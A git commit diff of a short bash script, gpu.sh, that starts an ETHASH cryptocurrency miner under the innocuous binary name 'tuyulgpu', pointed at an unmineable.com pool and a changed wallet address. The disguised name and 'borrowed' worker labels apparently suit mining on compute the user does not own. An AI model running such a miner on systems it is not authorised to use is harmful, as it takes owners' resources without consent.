550dae5d3d69872512097af868f173deac8ed37c
bruhinbru <85330115+bruhinbru@users.noreply.github.com>
2021-06-09 16:42:47 +0800

    Update gpu.sh

--- gpu.sh
+++ gpu.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 POOL=ethash.unmineable.com:3333
-WALLET=TRX:TA341dN8GbhAyVfPb9A3Gwxnq3eMSbrcLD
-WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)
+WALLET=WIN:TLgUTv5RYQ7tU95iScHCZTLfPAsm4JXJh6
+WORKEER=$(echo $(shuf -i 1000-9999 -n 1)-USER1#tulc-zc71)
 
-chmod +x tuyulgpu
-./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
+
+./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKEER --ethstratum ETHPROXY
